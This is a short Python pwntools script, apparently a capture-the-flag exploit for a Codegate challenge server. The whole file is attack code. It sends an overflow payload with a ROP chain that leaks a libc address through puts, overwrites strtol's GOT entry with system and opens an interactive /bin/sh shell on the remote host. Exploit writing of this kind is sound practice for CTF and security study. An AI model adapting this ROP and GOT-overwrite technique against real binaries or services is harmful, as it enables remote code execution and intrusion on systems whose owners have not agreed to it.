#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "ch41l3ng3s.codegate.kr"
port = 3131
r = remote(host,port)

r.recvuntil("(1-3)")

context.arch = "amd64"
puts = 0x4006c0
puts_got = 0x602020
pop_rdi = 0x0000000000400bc3
pop_rdx = 0x000000000040087c
pop_rsi_r15 = 0x0000000000400bc1
strtol = 0x602068
strtol_plt = 0x400750
read = 0x400700
rop = flat([pop_rdi,puts_got,puts,pop_rdi,0,pop_rsi_r15,strtol,0,pop_rdx,0x10,read,pop_rdi,strtol+8,strtol_plt])
payload = "0 " + "a"*182 + rop

r.sendline(payload)
r.recvuntil(":(")
r.recvuntil("\n")
libc = u64(r.recvuntil("\n").strip().ljust(8,"\x00")) - 0x6f690
print hex(libc)
system = libc + 0x45390
r.sendline(p64(system) + "/bin/sh\x00")
r.interactive()
